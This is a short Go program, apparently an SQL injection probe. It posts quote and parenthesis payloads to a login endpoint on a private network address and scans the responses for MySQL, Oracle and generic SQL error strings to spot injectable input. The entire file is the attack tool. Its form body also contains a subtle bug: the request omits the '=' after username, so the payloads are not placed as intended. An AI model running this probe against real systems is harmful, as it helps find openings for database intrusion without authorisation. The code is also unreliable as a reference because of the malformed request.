package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net/http"
	"regexp"
)

func main() {
	payloads := []string{
		"baseline",
		")",
		"(",
		"\"",
		"'",
	}
	sqlErrors := []string{
		"SQL",
		"MYSQL",
		"ORA-",
		"syntax",
	}

	errRegexes := []*regexp.Regexp{}
	for _, e := range sqlErrors {
		re := regexp.MustCompile(fmt.Sprintf(".*%s.*", e))
		errRegexes = append(errRegexes, re)
	}
	for _, payload := range payloads {
		client := new(http.Client)
		body := []byte(fmt.Sprintf("username%s&password=p", payload))
		req, err := http.NewRequest("POST", "http://10.0.1.20:8080/WebApplication/login/jsp",
			bytes.NewReader(body))
		if err != nil {
			log.Fatalf("[!] Unable to generate request: %s\n", err)
		}
		req.Header.Add("Content-Type", "Application/x-www-form-urlencoded")
		resp, err := client.Do(req)
		if err != nil {
			log.Fatalf("[!] Unable to process response %s\n", err)

		}
		body, err = io.ReadAll(resp.Body)
		if err != nil {
			log.Fatalf("[!] Unable to read response body: %s\n", err)
		}
		resp.Body.Close()
		for idx, re := range errRegexes {
			if re.MatchString(string(body)) {
				fmt.Printf("[+] SQL error found (%s) for payload: %s\n", sqlErrors[idx], payload)
				break
			}
		}

	}

}
